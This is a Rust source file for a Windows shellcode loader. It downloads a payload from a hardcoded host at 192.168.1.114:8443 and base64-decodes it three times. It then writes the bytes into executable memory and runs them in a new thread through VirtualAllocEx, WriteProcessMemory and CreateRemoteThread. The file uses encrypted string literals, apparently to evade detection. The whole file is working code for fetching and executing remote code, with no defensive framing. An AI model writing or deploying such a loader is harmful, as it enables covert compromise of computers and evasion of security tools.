extern crate reqwest;
extern crate base64;
extern crate tokio;
extern crate windows;
extern crate litcrypt;

use std::ptr;
use std::ffi::c_void;
use reqwest::Client;
use base64::decode;
use windows::{
    Win32::{
        Foundation::{
            CloseHandle,
            GetLastError
        },
        System::{
            Memory::{
                VirtualAllocEx, 
                MEM_COMMIT,
                MEM_RESERVE,
                // PAGE_READWRITE,
                PAGE_EXECUTE_READWRITE,
            },
            WindowsProgramming::INFINITE,
            Threading::{
                OpenProcess,
                CreateRemoteThread,
                GetCurrentProcessId,
                PROCESS_ALL_ACCESS,
                WaitForSingleObject
            }
        },
    },
    Win32::System::Diagnostics::Debug::WriteProcessMemory,
};


use litcrypt::{lc, use_litcrypt};

use_litcrypt!();


/// The URL where shellcode will be downloaded from
const URL: &str = "http://192.168.1.114:8443/note.txt";
/// The # of base64 iterations to decode
const B64_ITERATIONS: usize = 3;

fn decode_shellcode(sc: String, b64_iterations: usize) -> Result<Vec<u8>, String> {
    let mut shellcode_vec = Vec::from(sc.trim().as_bytes());
    for _i in 0..b64_iterations {
        match decode(shellcode_vec) {
            Ok(d) => {
                shellcode_vec = d
                    .into_iter()
                    .filter(|&b| b != 0x0a)
                    .collect();
            },
            Err(e) => { 
                let err_msg = e.to_string();
                return Err(err_msg.to_owned()); 
            }
        };
    }
    Ok(shellcode_vec)
}

async fn get_shellcode(url: String, b64_iterations: usize) -> Result<Vec<u8>, String> {
    // Download shellcode, or try to
    let client = Client::new();
    if let Ok(r) = client.get(url).send().await {
        if r.status().is_success() {   
            // Get the shellcode. Now we have to decode it
            let shellcode_decoded: Vec<u8>;
            let shellcode_final_vec: Vec<u8>;
            if let Ok(sc) = r.text().await {
                match decode_shellcode(sc, b64_iterations) {
                    Ok(scd) => { shellcode_decoded = scd; },
                    Err(e)  => { return Err(e); }
                }; 
    
                // Convert bytes to our proper string
                // This only happens on Windows
                let shellcode_string: String;
                if let Ok(s) = String::from_utf8(shellcode_decoded) {
                    shellcode_string = s;
                } else {
                    let err_msg = lc!("Could not convert bytes to string");
                    return Err(err_msg);
                }                    
                // At this point, we have the comma-separated "0xNN" form of the shellcode.
                // We need to get each one until a proper u8.
                // Now, keep in mind we only do this for Windows, because we pretty much only make raw byes,
                // Not '0x' strings for Linux.
                shellcode_final_vec = shellcode_string
                    .split(",")
                    .map(|s| s.replace("0x", ""))
                    .map(|s| s.replace(" ", ""))                    
                    .map(|s|{ 
                        match u8::from_str_radix(&s, 16) {
                            Ok(b) => b,
                            Err(_) => 0
                        }
                    })
                    .collect();
                
                // The actual success
                return Ok(shellcode_final_vec);

            } else {
                let err_msg = lc!("Could not decode shellcode");
                return Err(err_msg);
            }

        } else {
            return Err(r.text().await.unwrap());
        }   

    } else {
        return Err(lc!("Could not download shellcode"));
    }
} 

#[tokio::main]
async fn main() {

    // Grab b64-encoded data from the provided url
    // Decode n_iters times
    // CreateThread with the shellcode
    match get_shellcode(URL.to_string(), B64_ITERATIONS).await {

        Ok(sc) => unsafe {

            let pid: u32 = GetCurrentProcessId();
            println!("Current PID: {pid}");
            let h = OpenProcess(PROCESS_ALL_ACCESS, false, pid).unwrap();
            println!("Handle: {:?}", h);
            let addr = VirtualAllocEx(h, Some(ptr::null_mut()), sc.len(), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
            let mut n = 0;
            WriteProcessMemory(h, addr, sc.as_ptr() as  _, sc.len(), Some(&mut n));
            let h_thread = CreateRemoteThread(
                h, 
                None, 
                0, 
                Some(std::mem::transmute(addr)), 
                None,
                0, 
                None
            )
            .unwrap();
            
            println!("Handle: {:?}", h_thread);
            
            CloseHandle(h);

            
            // if WaitForSingleObject(h_thread, INFINITE) == windows::Win32::Foundation::WIN32_ERROR(0) {
            //    println!("{}", lc!("Good!"));
            //    println!("{}", lc!("Injection completed!"));
            // } else {
            //    let error = GetLastError();
            //    println!("{:?}", error);
            // }
        },
        Err(e) => {
            println!("{e}")
        }
    }
    
}
